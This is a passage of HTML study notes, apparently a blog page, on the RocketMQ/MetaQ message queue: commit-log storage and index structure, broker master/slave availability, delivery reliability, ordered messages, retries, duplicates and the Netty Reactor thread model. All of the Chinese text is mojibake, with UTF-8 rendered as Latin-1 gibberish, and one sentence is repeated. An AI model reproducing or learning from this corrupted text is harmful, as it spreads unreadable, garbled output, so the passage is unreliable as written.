<li>Consumerï¼šæ¶ˆæ¯æ¥æ”¶æ–¹ï¼Œéœ€è¦ä¸å…¶ä¸­ä¸€ä¸ªname serverå»ºç«‹è¿æ¥ï¼Œè·å¾—è·¯ç”±ä¿¡æ¯ï¼Œå†å‘æä¾›æœåŠ¡çš„masterã€slaverå»ºç«‹é•¿è¿æ¥ï¼Œå…·ä½“æ¥æ”¶æ¶ˆæ¯æ—¶åˆ»é€‰æ‹©broker</li>
</ul>
<h3 id="å­˜å‚¨ç»“æ„" tabindex="-1"> å­˜å‚¨ç»“æ„</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-26-02.png" alt="" loading="lazy"></p>
<p>ç‰©ç†é˜Ÿåˆ—åªæœ‰ä¸€ä¸ªï¼Œé‡‡ç”¨å›ºå®šå¤§å°çš„æ–‡ä»¶é¡ºåºå­˜å‚¨æ¶ˆæ¯ã€‚é€»è¾‘é˜Ÿåˆ—æœ‰å¤šä¸ªï¼Œæ¯ä¸ªé€»è¾‘é˜Ÿåˆ—æœ‰å¤šä¸ªåˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºæœ‰å¤šä¸ªç´¢å¼•ã€‚</p>
<p>a.æ¶ˆæ¯é¡ºåºå†™å…¥ç‰©ç†æ–‡ä»¶é‡Œé¢ï¼Œæ¯ä¸ªæ–‡ä»¶è¾¾åˆ°ä¸€å®šçš„å¤§å°ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ç»§ç»­é¡ºåºå†™æ•°æ®ï¼ˆæ¶ˆæ¯çš„å†™å…¥æ˜¯ä¸²è¡Œçš„ï¼Œé¿å…äº†ç£ç›˜ç«äº‰ï¼‰ã€‚</p>
<p>b.æ¶ˆæ¯çš„ç´¢å¼•åˆ™é¡ºåºçš„å†™å…¥é€»è¾‘æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸å­˜æ”¾çœŸæ­£çš„æ¶ˆæ¯ï¼Œåªæ˜¯å­˜æ”¾æŒ‡å‘æ¶ˆæ¯çš„ç´¢å¼•ã€‚ metaqå¯¹äºå®¢æˆ·ç«¯å±•ç°çš„æ˜¯é€»è¾‘é˜Ÿåˆ—å°±æ˜¯æ¶ˆè´¹é˜Ÿåˆ—ï¼Œconsumerä»æ¶ˆè´¹é˜Ÿåˆ—é‡Œé¡ºåºå–æ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ã€‚</p>
<p>è¿™ç§è®¾è®¡æ˜¯æŠŠç‰©ç†å’Œé€»è¾‘åˆ†ç¦»ï¼Œæ¶ˆè´¹é˜Ÿåˆ—æ›´åŠ è½»é‡åŒ–ã€‚æ‰€ä»¥metaqå¯ä»¥æ”¯æ’‘æ›´å¤šçš„æ¶ˆè´¹é˜Ÿåˆ—æ•°ï¼Œæå‡æ¶ˆæ¯çš„ååé‡ï¼Œå¹¶ä¸”æœ‰ä¸€å®šçš„æ¶ˆæ¯å †ç§¯èƒ½åŠ›ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-05-40.png" alt="" loading="lazy"></p>
<p>ç¼ºç‚¹ ï¼š å†™è™½ç„¶æ˜¯é¡ºåºå†™ï¼Œä½†æ˜¯è¯»å´æ˜¯éšæœºè¯»çš„ è§£å†³åŠæ³• ï¼šå°½å¯èƒ½è®©è¯»å‘½ä¸­pageCacheï¼Œå‡å°‘ç£ç›˜IOæ¬¡æ•°ï¼Œ metaqçš„æ‰€æœ‰æ¶ˆæ¯éƒ½æ˜¯æŒä¹…åŒ–çš„ï¼Œå…ˆå†™å…¥ç³»ç»ŸPAGECACHEï¼ˆé¡µé«˜é€Ÿç¼“å­˜ï¼‰ï¼Œç„¶ååˆ·ç›˜ï¼Œå¯ä»¥ä¿è¯å†…å­˜ä¸ç£ç›˜éƒ½æœ‰ä¸€ä»½æ•°æ®ï¼Œè®¿é—®æ—¶ï¼Œç›´æ¥ä»å†…å­˜è¯»å–ã€‚ åˆ·ç›˜ç­–ç•¥åˆ†ä¸ºå¼‚æ­¥å’ŒåŒæ­¥ä¸¤ç§ã€‚</p>
<h3 id="æ•´ä½“å­˜å‚¨ç»“æ„" tabindex="-1"> æ•´ä½“å­˜å‚¨ç»“æ„</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-15-23-02.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-59-39.png" alt="" loading="lazy"></p>
<h4 id="indexç»“æ„" tabindex="-1"> indexç»“æ„</h4>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-16-22-22.png" alt="" loading="lazy"></p>
<p>Headerï¼šè®°å½•è½Brokeræ—¶é—´æˆ³ã€åç§»é‡ï¼Œæ§½ä½æ•°ç›®å’Œç´¢å¼•ä¸ªæ•°</p>
<p>SlotTableï¼šæ•°ç»„æ’æ§½ï¼Œæ’æ§½ä½ç½® = keyçš„Hashå€¼ % æ’æ§½æ•°é‡ï¼Œæ¯ä¸ªæ§½ä½è®°å½•å½“å‰ç´¢å¼•æ€»æ•°</p>
<p>Index Linked Listï¼šæ’æ§½åæ¥çš„é“¾è¡¨ç»“æ„ï¼Œè®°å½•keyçš„Hashå€¼ã€ç‰©ç†åç§»åœ°å€ã€è½ç›˜æ—¶é—´å’Œå“ˆå¸Œå†²çªåä¸Šä¸€ä¸ªç´¢å¼•åœ°å€</p>
<ul>
<li>é€šè¿‡MessageKeyæ£€ç´¢æ¶ˆæ¯ï¼šé€šè¿‡keyå®šä½slotï¼ŒåŠ é”ä»æœ€å¤§ç´¢å¼•å€¼å¼€å§‹å€’åºæŸ¥æ‰¾ï¼Œæ¯”å¯¹hashå€¼å’Œè½ç›˜æ—¶é—´ï¼Œè¿”å›ä¸€è‡´æ—¶çš„ç‰©ç†åç§»åœ°å€ã€‚</li>
</ul>
<h2 id="ç»„ä»¶" tabindex="-1"> ç»„ä»¶</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-40-20.png" alt="" loading="lazy"></p>
<h3 id="broker" tabindex="-1"> broker</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-34-37.png" alt="" loading="lazy"></p>
<h4 id="è´Ÿè½½å‡è¡¡" tabindex="-1"> è´Ÿè½½å‡è¡¡</h4>
<ul>
<li>ä¸€ä¸ªtopicåˆ†å¸ƒåœ¨å¤šä¸ªbrokerä¸Šï¼Œä¸€ä¸ªbrokerå¯ä»¥é…ç½®å¤šä¸ªtopicï¼Œå®ƒä»¬æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ã€‚</li>
<li>å¦‚æœæŸä¸ªtopicæ¶ˆæ¯é‡å¾ˆå¤§ï¼Œåº”è¯¥ç»™å®ƒå¤šé…ç½®å‡ ä¸ªé˜Ÿåˆ—ï¼Œå¹¶ä¸”å°½é‡å¤šåˆ†å¸ƒåœ¨ä¸åŒbrokerä¸Šï¼Œå‡è½»æŸä¸ªbrokerçš„å‹åŠ›ã€‚</li>
<li>topicæ¶ˆæ¯é‡éƒ½æ¯”è¾ƒå‡åŒ€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæŸä¸ªbrokerä¸Šçš„é˜Ÿåˆ—è¶Šå¤šï¼Œåˆ™è¯¥brokerå‹åŠ›è¶Šå¤§ã€‚</li>
</ul>
<h4 id="å¯ç”¨æ€§" tabindex="-1"> å¯ç”¨æ€§</h4>
<p>ç”±äºæ¶ˆæ¯åˆ†å¸ƒåœ¨å„ä¸ªbrokerä¸Šï¼Œä¸€æ—¦æŸä¸ªbrokerå®•æœºï¼Œåˆ™è¯¥brokerä¸Šçš„æ¶ˆæ¯è¯»å†™éƒ½ä¼šå—åˆ°å½±å“ã€‚æ‰€ä»¥rocketmqæä¾›äº†master/slaveçš„ç»“æ„ï¼Œsalveå®šæ—¶ä»masteråŒæ­¥æ•°æ®ï¼Œå¦‚æœmasterå®•æœºï¼Œåˆ™slaveæä¾›æ¶ˆè´¹æœåŠ¡ï¼Œä½†æ˜¯ä¸èƒ½å†™å…¥æ¶ˆæ¯ï¼Œæ­¤è¿‡ç¨‹å¯¹åº”ç”¨é€æ˜ï¼Œç”±rocketmqå†…éƒ¨è§£å†³ã€‚</p>
<ul>
<li>ä¸€æ—¦æŸä¸ªbroker masterå®•æœºï¼Œç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å¤šä¹…æ‰èƒ½å‘ç°ï¼Ÿå—é™äºrocketmqçš„ç½‘ç»œè¿æ¥æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæœ€å¤šéœ€è¦30ç§’ï¼Œä½†è¿™ä¸ªæ—¶é—´å¯ç”±åº”ç”¨è®¾å®šå‚æ•°æ¥ç¼©çŸ­æ—¶é—´ã€‚è¿™ä¸ªæ—¶é—´æ®µå†…ï¼Œå‘å¾€è¯¥brokerçš„æ¶ˆæ¯éƒ½æ˜¯å¤±è´¥çš„ï¼Œè€Œä¸”è¯¥brokerçš„æ¶ˆæ¯æ— æ³•æ¶ˆè´¹ï¼Œå› ä¸ºæ­¤æ—¶æ¶ˆè´¹è€…ä¸çŸ¥é“è¯¥brokerå·²ç»æŒ‚æ‰ã€‚</li>
<li>æ¶ˆè´¹è€…å¾—åˆ°masterå®•æœºé€šçŸ¥åï¼Œè½¬å‘slaveæ¶ˆè´¹ï¼Œä½†æ˜¯slaveä¸èƒ½ä¿è¯masterçš„æ¶ˆæ¯100%éƒ½åŒæ­¥è¿‡æ¥äº†ï¼Œå› æ­¤ä¼šæœ‰å°‘é‡çš„æ¶ˆæ¯ä¸¢å¤±ã€‚ä½†æ˜¯æ¶ˆæ¯æœ€ç»ˆä¸ä¼šä¸¢çš„ï¼Œä¸€æ—¦masteræ¢å¤ï¼ŒæœªåŒæ­¥è¿‡å»çš„æ¶ˆæ¯ä¼šè¢«æ¶ˆè´¹æ‰ã€‚</li>
</ul>
<h2 id="ç‰¹æ€§" tabindex="-1"> ç‰¹æ€§</h2>
<h3 id="æ¶ˆæ¯çš„å¯é æ€§ä¿è¯" tabindex="-1"> æ¶ˆæ¯çš„å¯é æ€§ä¿è¯</h3>
<p>ä¸€ä¸ªæ¶ˆæ¯ä»å‘é€ç«¯åº”ç”¨ï¼Œåˆ°æ¶ˆè´¹ç«¯åº”ç”¨ï¼Œä¸­é—´æœ‰ä¸‰ä¸ªè¿‡ç¨‹éœ€è¦ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ã€‚</p>
<p>1.å‘é€ç«¯å‘æ¶ˆæ¯</p>
<p>æ¶ˆæ¯ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åè¿”å›SendResultï¼Œå¦‚æœisSuccessè¿”å›ä¸ºtrue,åˆ™è¡¨ç¤ºæ¶ˆæ¯å·²ç»ç¡®è®¤å‘é€åˆ°æœåŠ¡å™¨å¹¶è¢«æœåŠ¡å™¨æ¥æ”¶å­˜å‚¨ã€‚æ•´ä¸ªå‘é€è¿‡ç¨‹æ˜¯ä¸€ä¸ªåŒæ­¥çš„è¿‡ç¨‹ã€‚ä¿è¯æ¶ˆæ¯é€è¾¾æœåŠ¡å™¨å¹¶è¿”å›ç»“æœã€‚ åªæœ‰å½“æ¶ˆæ¯ä¸­é—´ä»¶åŠæ—¶æ˜ç¡®çš„è¿”å›æˆåŠŸï¼Œæ‰èƒ½ç¡®è®¤æ¶ˆæ¯å¯é åˆ°è¾¾æ¶ˆæ¯ä¸­é—´ä»¶ã€‚</p>
<p>2.æ¶ˆæ¯ä¸­é—´ä»¶æŠŠæ¶ˆæ¯å­˜å‚¨èµ·æ¥</p>
<p>metaqæœåŠ¡å™¨æ”¶åˆ°æ¶ˆæ¯åé¦–å…ˆæŠŠæ¶ˆæ¯å­˜æ”¾åœ¨ç£ç›˜æ–‡ä»¶ä¸­ï¼Œç¡®ä¿æŒä¹…å­˜å‚¨ï¼Œå†™å…¥æˆåŠŸä¹‹åè¿”å›åº”ç­”ç»™å‘å¸ƒè€…ã€‚å› æ­¤ï¼Œå¯ä»¥ç¡®è®¤æ¯æ¡å‘é€ç»“æœä¸ºæˆåŠŸçš„æ¶ˆæ¯æœåŠ¡å™¨éƒ½æ˜¯å†™å…¥ç£ç›˜çš„ã€‚ å†…å­˜ä¸­å†…å®¹å±äºéæŒä¹…æ•°æ®ï¼Œä¼šåœ¨æ–­ç”µä¹‹åä¸¢å¤±ã€‚</p>
<p>åˆ·ç›˜æ–¹å¼æœ‰åŒæ­¥åŒå†™å’Œå¼‚æ­¥å¤åˆ¶ï¼š</p>
<ul>
<li>åŒæ­¥åŒå†™ï¼šä¸»å¤‡éƒ½åˆ·ç›˜å®Œæˆæ‰è¿”å›æˆåŠŸï¼Œèƒ½å¤Ÿä¿è¯æ•°æ®çš„å®Œå…¨å¯é æ€§ï¼Œä½†æ˜¯ç›®å‰ä¸»å¤‡ä¸èƒ½è‡ªåŠ¨åˆ‡æ¢ï¼Œè¿˜éœ€è¦æ‰‹åŠ¨åˆ‡æ¢ï¼Œæ‰€ä»¥ï¼Œè¿˜å¯èƒ½æœ‰éƒ¨åˆ†æ•°æ®ä¸¢å¤±ï¼ˆåˆ‡æ¢ä¸­çš„æ•°æ®ï¼‰ã€‚</li>
<li>å¼‚æ­¥å¤åˆ¶ï¼šå¼‚æ­¥çš„åŒæ­¥ä¸¤ä¸ªä¸»å¤‡ç£ç›˜ï¼Œå¯ä»¥ä¿è¯æ•°æ®çš„99%çš„ä¸ä¸¢ï¼Œä½†æ˜¯å½“ä¸»å¼‚å¸¸æ—¶å€™ï¼Œå¯èƒ½ä¼šæœ‰éƒ¨åˆ†æ•°æ®æ²¡æœ‰å¼‚æ­¥å¤åˆ¶å®Œæˆï¼Œå¯¼è‡´å°‘é‡æ•°æ®ä¸¢å¤±ã€‚broker slaveå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸æ–­ä»masteræ‹‰å–æ•°æ®ï¼Œç„¶åå¼‚æ­¥æ„å»ºconsume queueæ•°æ®ç»“æ„ã€‚</li>
</ul>
<p>3.æ¶ˆè´¹ç«¯æ¶ˆè´¹æ¶ˆæ¯</p>
<p>æ¶ˆè´¹è€…æ˜¯ä¸€æ¡æ¥ç€ä¸€æ¡åœ°é¡ºåºæ¶ˆè´¹æ¶ˆæ¯ï¼Œåªæœ‰åœ¨æˆåŠŸæ¶ˆè´¹ä¸€æ¡æ¶ˆæ¯åæ‰ä¼šæ¥ç€æ¶ˆè´¹ä¸‹ä¸€æ¡ã€‚ å¦‚æœåœ¨æ¶ˆè´¹æŸæ¡æ¶ˆæ¯å¤±è´¥ï¼ˆå¦‚å¼‚å¸¸ï¼‰ï¼Œåˆ™ä¼šå°è¯•é‡è¯•æ¶ˆè´¹è¿™æ¡æ¶ˆæ¯ï¼ˆé»˜è®¤æœ€å¤§5æ¬¡ï¼‰ï¼Œè¶…è¿‡æœ€å¤§æ¬¡æ•°åä»ç„¶æ— æ³•æ¶ˆè´¹ï¼Œåˆ™å°†æ¶ˆæ¯å­˜å‚¨åœ¨æ¶ˆè´¹è€…çš„æœ¬åœ°ç£ç›˜ï¼Œç”±åå°çº¿ç¨‹ç»§ç»­åšé‡è¯•ã€‚è€Œä¸»çº¿ç¨‹ç»§ç»­å¾€åèµ°ï¼Œæ¶ˆè´¹åç»­çš„æ¶ˆæ¯ã€‚ã€‚ç”±æ­¤æ¥ä¿è¯æ¶ˆæ¯çš„å¯é æ¶ˆè´¹ã€‚</p>
<h3 id="æ¶ˆæ¯å‘å¸ƒ" tabindex="-1"> æ¶ˆæ¯å‘å¸ƒ</h3>
<ol>
<li>æ¶ˆæ¯ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åè¿”å›SendResultï¼Œå¦‚æœisSuccessè¿”å›ä¸ºtrue,åˆ™è¡¨ç¤ºæ¶ˆæ¯å·²ç»ç¡®è®¤å‘é€åˆ°æœåŠ¡å™¨å¹¶è¢«æœåŠ¡å™¨æ¥æ”¶å­˜å‚¨ã€‚æ•´ä¸ªå‘é€è¿‡ç¨‹æ˜¯ä¸€ä¸ªåŒæ­¥çš„è¿‡ç¨‹ã€‚ä¿è¯æ¶ˆæ¯é€è¾¾æœåŠ¡å™¨å¹¶è¿”å›ç»“æœã€‚ åªæœ‰å½“æ¶ˆæ¯ä¸­é—´ä»¶åŠæ—¶æ˜ç¡®çš„è¿”å›æˆåŠŸï¼Œæ‰èƒ½ç¡®è®¤æ¶ˆæ¯å¯é åˆ°è¾¾æ¶ˆæ¯ä¸­é—´ä»¶ã€‚</li>
<li>å‘é€æ¶ˆæ¯æ—¶ï¼Œå¦‚æœè®¢é˜…æ–¹æœ‰è¿‡æ»¤éœ€æ±‚ï¼Œè¯·åœ¨æ¶ˆæ¯Tagå±æ€§ä¸Šè®¾ç½®ç›¸å…³å€¼ï¼ŒTagçš„åç§°ä¸éœ€è¦ç”³è¯·ï¼Œå¯è‡ªç”±è®¾ç½®ï¼Œä¸€æ¡æ¶ˆæ¯åªå…è®¸è®¾ç½®ä¸€ä¸ªTagã€‚</li>
</ol>
<h3 id="æ¶ˆæ¯è®¢é˜…" tabindex="-1"> æ¶ˆæ¯è®¢é˜…</h3>
<ol>
<li>éé¡ºåºæ¶ˆæ¯æ¶ˆè´¹ï¼Œè€—æ—¶æ—¶é—´ä¸åšé™åˆ¶ï¼Œä½†æ˜¯åº”ç”¨åº”è¯¥å°½å¯èƒ½ä¿è¯è€—æ—¶çŸ­ï¼Œè¿™æ ·æ‰èƒ½è¾¾åˆ°é«˜æ€§èƒ½ï¼Œå¦å¤–æ¶ˆè´¹æ¶ˆæ¯Hangä½ï¼Œä¼šå¯¼è‡´æ¶ˆæ¯æ‰€åœ¨é˜Ÿåˆ—çš„æ¶ˆè´¹åŠ¨ä½œæš‚åœï¼Œç›´åˆ°Hangä½çš„æ¶ˆæ¯æ¶ˆè´¹å®Œã€‚å¯¹å…¶ä»–é˜Ÿåˆ—ä¸å—å½±å“</li>
<li>é¡ºåºæ¶ˆæ¯æ¶ˆè´¹ï¼Œè€—æ—¶æ—¶é—´æœ‰é™åˆ¶ï¼Œè¦ä¿è¯æ¯æ¡æ¶ˆæ¯åœ¨30så†…æ¶ˆè´¹å®Œï¼Œè¶…è¿‡30sä¼šæœ‰æ½œåœ¨çš„ä¹±åºé—®é¢˜ã€‚ï¼ˆåŸå› æ˜¯åˆ†å¸ƒå¼é”è¶…æ—¶é—®é¢˜ï¼Œä½†æ¦‚ç‡æä½ï¼‰</li>
<li>æ¶ˆè´¹æ–¹å¼ï¼š
<ul>
<li>é›†ç¾¤æ¶ˆè´¹ï¼Œä¸€æ¡æ¶ˆæ¯åªä¼šè¢«åŒä¸€ä¸ªgroupé‡Œä¸€ä¸ªæ¶ˆè´¹ç«¯æ¶ˆè´¹ã€‚ä¸åŒgroupä¹‹é—´ç›¸äº’ä¸å½±å“ã€‚</li>
<li>å¹¿æ’­æ¶ˆè´¹ï¼Œä¸€æ¡æ¶ˆæ¯ä¼šè¢«åŒä¸€ä¸ªgroupé‡Œæ¯ä¸€ä¸ªæ¶ˆè´¹ç«¯æ¶ˆè´¹ã€‚</li>
</ul>
</li>
<li>æ¶ˆæ¯å †ç§¯ï¼šMetaQæ¯å°æœåŠ¡å™¨æä¾›å¤§çº¦äº¿çº§çš„æ¶ˆæ¯å †ç§¯èƒ½åŠ›ï¼ˆå¤šä¸ªä¸šåŠ¡æ–¹å…±ç”¨ï¼‰ï¼Œè¶…è¿‡å †ç§¯é˜€å€¼ï¼Œè®¢é˜…æ¶ˆæ¯ååé‡ä¼šä¸‹é™ã€‚</li>
</ol>
<h3 id="é¡ºåºæ¶ˆæ¯" tabindex="-1"> é¡ºåºæ¶ˆæ¯</h3>
<p>æ™®é€šé¡ºåºæ¶ˆæ¯ï¼šæ­£å¸¸æƒ…å†µä¸‹ä¿è¯å®Œå…¨çš„æ¶ˆæ¯é¡ºåºï¼Œä¸€æ—¦å¼‚å¸¸ï¼Œbrokeré‡å¯ï¼Œç”±äºé˜Ÿåˆ—æ€»æ•°å‘ç”Ÿå˜åŒ–ï¼Œå“ˆå¸Œå–æ¨¡åå®šä½çš„é˜Ÿåˆ—ä¼šå˜åŒ–ï¼Œäº§ç”ŸçŸ­æš‚çš„æ¶ˆæ¯é¡ºåºä¸ä¸€è‡´ã€‚</p>
<p>ä¸¥æ ¼é¡ºåºæ¶ˆæ¯ï¼šæ— è®ºæ­£å¸¸å¼‚å¸¸æƒ…å†µéƒ½èƒ½ä¿è¯é¡ºåºï¼Œä½†æ˜¯ç‰ºç‰²äº†åˆ†å¸ƒå¼Failover ï¼ˆåˆ†å¸ƒå¼å¼‚å¸¸å›å¤æœºåˆ¶ï¼‰ç‰¹æ€§ï¼Œå³Broker é›†ç¾¤ä¸­åªè¦æœ‰ä¸€å°æœºå™¨ä¸å¯ç”¨ï¼Œåˆ™æ•´ä¸ªé›†ç¾¤éƒ½ä¸å¯ç”¨ï¼ŒæœåŠ¡å¯ç”¨æ€§å¤§å¤§é™ä½ã€‚æ— è®ºæ­£å¸¸å¼‚å¸¸æƒ…å†µéƒ½èƒ½ä¿è¯é¡ºåºï¼Œä½†æ˜¯ç‰ºç‰²äº†åˆ†å¸ƒå¼Failover ç‰¹æ€§ï¼Œå³Broker é›†ç¾¤ä¸­åªè¦æœ‰ä¸€å°æœºå™¨ä¸å¯ç”¨ï¼Œåˆ™æ•´ä¸ªé›†ç¾¤éƒ½ä¸å¯ç”¨ï¼ŒæœåŠ¡å¯ç”¨æ€§å¤§å¤§é™ä½ã€‚</p>
<h3 id="æ¶ˆæ¯è¿‡æ»¤" tabindex="-1"> æ¶ˆæ¯è¿‡æ»¤</h3>
<p>åœ¨Broker ä¸­ï¼ŒæŒ‰ç…§Consumer çš„è¦æ±‚åšè¿‡æ»¤ï¼Œä¼˜ç‚¹æ˜¯å‡å°‘äº†å¯¹äºConsumer æ— ç”¨æ¶ˆæ¯çš„ç½‘ç»œä¼ è¾“ã€‚ç¼ºç‚¹æ˜¯å¢åŠ äº†Broker çš„è´Ÿæ‹…ï¼Œå®ç°ç›¸å¯¹å¤æ‚ã€‚Notify æ”¯æŒå¤šç§è¿‡æ»¤æ–¹å¼ï¼ŒåŒ…å«ç›´æ¥æŒ‰ç…§æ¶ˆæ¯ç±»å‹è¿‡æ»¤ï¼Œçµæ´»çš„è¯­æ³•è¡¨è¾¾å¼è¿‡æ»¤ï¼Œå‡ ä¹å¯ä»¥æ»¡è¶³æœ€è‹›åˆ»çš„è¿‡æ»¤éœ€æ±‚ã€‚metaq æ”¯æŒæŒ‰ç…§ç®€å•çš„Message Tag è¿‡æ»¤ï¼Œä¹Ÿæ”¯æŒæŒ‰ç…§Message Headerã€body è¿›è¡Œè¿‡æ»¤ã€‚</p>
<h3 id="æ¶ˆæ¯é‡è¯•" tabindex="-1"> æ¶ˆæ¯é‡è¯•</h3>
<ol>
<li>éé¡ºåºæ¶ˆæ¯æ¶ˆè´¹å¤±è´¥é‡è¯•ï¼Œæ¶ˆè´¹å¤±è´¥çš„æ¶ˆæ¯å‘å›æœåŠ¡å™¨ï¼Œåº”ç”¨å¯ä»¥æŒ‡å®šè¿™æ¡å¤±è´¥æ¶ˆæ¯ä¸‹æ¬¡åˆ°è¾¾Consumerçš„æ—¶é—´ã€‚æ¶ˆè´¹å¤±è´¥é‡è¯•æ¬¡æ•°æœ‰é™åˆ¶ï¼Œé€šå¸¸çº¿ä¸Šä¸ºæ¯ä¸ªè®¢é˜…ç»„æ¯æ¡å¤±è´¥æ¶ˆæ¯é‡è¯•5æ¬¡ï¼ˆæ¯æ¬¡æ¶ˆæ¯éƒ½ä¼šå®šæ—¶é‡è¯•ï¼Œå®šæ—¶æ—¶é—´éšç€é‡è¯•æ¬¡æ•°é€’å¢ï¼Œæ­¤è¿‡ç¨‹åº”ç”¨å¯å¹²é¢„ï¼‰ã€‚è¶…è¿‡é‡è¯•æ¬¡æ•°ï¼Œæ¶ˆæ¯è¿›å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼Œå¹¶å‘ç”¨æˆ·æŠ¥è­¦ã€‚</li>
<li>é¡ºåºæ¶ˆæ¯æ¶ˆè´¹å¤±è´¥é‡è¯•ï¼ŒæŸä¸ªé˜Ÿåˆ—æ­£åœ¨æ¶ˆè´¹çš„æ¶ˆæ¯æ¶ˆè´¹å¤±è´¥ï¼Œä¼šå°†å½“å‰é˜Ÿåˆ—æŒ‚èµ·ï¼ˆæŒ‚èµ·æ—¶é—´åº”ç”¨å¯é€šè¿‡APIè®¾ç½®ï¼‰ï¼Œå…¶ä»–é˜Ÿåˆ—ä»ç„¶æ­£å¸¸æ¶ˆè´¹ã€‚</li>
</ol>
<h3 id="æ¶ˆæ¯é‡å¤æ€§" tabindex="-1"> æ¶ˆæ¯é‡å¤æ€§</h3>
<p>MetaQä¸èƒ½ä¿è¯æ¶ˆæ¯ä¸é‡å¤</p>
<ul>
<li>å‘é€æ¶ˆæ¯é˜¶æ®µï¼Œä¼šå­˜åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹å…¸å‹çš„è¶…æ—¶é—®é¢˜ï¼Œå³å‘é€æ¶ˆæ¯é˜¶æ®µä¸èƒ½ä¿è¯æ¶ˆæ¯ä¸é‡å¤ã€‚</li>
<li>è®¢é˜…æ¶ˆæ¯é˜¶æ®µï¼Œç”±äºæ¶‰åŠé›†ç¾¤è®¢é˜…ï¼Œå¤šä¸ªè®¢é˜…è€…éœ€è¦Rebalanceæ–¹å¼è®¢é˜…ï¼Œåœ¨RebalanceçŸ­æš‚ä¸ä¸€è‡´æƒ…å†µä¸‹ï¼Œä¼šäº§ç”Ÿæ¶ˆæ¯é‡å¤</li>
<li>è®¢é˜…è€…æ„å¤–å®•æœºï¼Œæ¶ˆè´¹è¿›åº¦æœªåŠæ—¶å­˜å‚¨ï¼Œä¹Ÿä¼šäº§ç”Ÿæ¶ˆæ¯é‡å¤</li>
</ul>
<p>è§£å†³</p>
<ul>
<li>åº”ç”¨æ–¹æ”¶åˆ°æ¶ˆæ¯åï¼Œå¯é€šè¿‡Tairã€DBç­‰å»é‡</li>
<li>åº”ç”¨æ–¹å¯é€šè¿‡ä¸»åŠ¨æ‹‰çš„æ–¹å¼ï¼Œå¯ä¿è¯æ‹‰æ¶ˆæ¯ç»å¯¹ä¸é‡å¤ï¼Œä½†æ˜¯åˆ†å¸ƒå¼åè°ƒåˆ†é…é˜Ÿåˆ—é—®é¢˜éœ€è¦åº”ç”¨æ¥æ§åˆ¶</li>
</ul>
<h2 id="é€šä¿¡" tabindex="-1"> é€šä¿¡</h2>
<h3 id="é€šä¿¡æ–¹å¼" tabindex="-1"> é€šä¿¡æ–¹å¼</h3>
<p>åŒæ­¥(sync)
å¼‚æ­¥(async)
å•å‘(oneway)</p>
<h3 id="reactorå¤šçº¿ç¨‹" tabindex="-1"> Reactorå¤šçº¿ç¨‹</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-16-03-32.png" alt="" loading="lazy"></p>
<p>ä¸€ä¸ª Reactor ä¸»çº¿ç¨‹ï¼ˆeventLoopGroupBossï¼Œå³ä¸ºä¸Šé¢çš„1ï¼‰è´Ÿè´£ç›‘å¬ TCPç½‘ç»œè¿æ¥è¯·æ±‚ï¼Œå»ºç«‹å¥½è¿æ¥åä¸¢ç»™Reactor çº¿ç¨‹æ± ï¼ˆeventLoopGroupSelectorï¼Œå³ä¸ºä¸Šé¢çš„â€œNâ€ï¼Œæºç ä¸­é»˜è®¤è®¾ç½®ä¸º3ï¼‰ï¼Œå®ƒè´Ÿè´£å°†å»ºç«‹å¥½è¿æ¥çš„socket æ³¨å†Œåˆ° selectorä¸Šå»ï¼ˆRocketMQçš„æºç ä¸­ä¼šè‡ªåŠ¨æ ¹æ®OSçš„ç±»å‹é€‰æ‹©NIOå’ŒEpollï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‚æ•°é…ç½®ï¼‰ï¼Œç„¶åç›‘å¬çœŸæ­£çš„ç½‘ç»œæ•°æ®ã€‚æ‹¿åˆ°ç½‘ç»œæ•°æ®åï¼Œå†ä¸¢ç»™Workerçº¿ç¨‹æ± ï¼ˆdefaultEventExecutorGroupï¼Œå³ä¸ºä¸Šé¢çš„â€œM1â€ï¼Œæºç ä¸­é»˜è®¤è®¾ç½®ä¸º8ï¼‰ã€‚</p>
<p>ä¸ºäº†æ›´ä¸ºé«˜æ•ˆçš„å¤„ç†RPCçš„ç½‘ç»œè¯·æ±‚ï¼Œè¿™é‡Œçš„Workerçº¿ç¨‹æ± æ˜¯ä¸“é—¨ç”¨äºå¤„ç†Nettyç½‘ç»œé€šä¿¡ç›¸å…³çš„ï¼ˆåŒ…æ‹¬ç¼–ç /è§£ç ã€ç©ºé—²é“¾æ¥ç®¡ç†ã€ç½‘ç»œè¿æ¥ç®¡ç†ä»¥åŠç½‘ç»œè¯·æ±‚å¤„ç†ï¼‰ã€‚è€Œå¤„ç†ä¸šåŠ¡æ“ä½œæ”¾åœ¨ä¸šåŠ¡çº¿ç¨‹æ± ä¸­æ‰§è¡Œï¼ˆåœ¨NettyServerHandlerä¸­ï¼Œå¯¹æ¥æ”¶åˆ°çš„è¯·æ±‚æ•°æ®å¤„ç†ï¼‰ï¼Œæ ¹æ® RomotingCommand çš„ä¸šåŠ¡è¯·æ±‚ç codeå»processorTableè¿™ä¸ªæœ¬åœ°ç¼“å­˜å˜é‡ä¸­æ‰¾åˆ°å¯¹åº”çš„ processorï¼Œç„¶åå°è£…æˆtaskä»»åŠ¡åï¼Œæäº¤ç»™å¯¹åº”çš„ä¸šåŠ¡processorå¤„ç†çº¿ç¨‹æ± 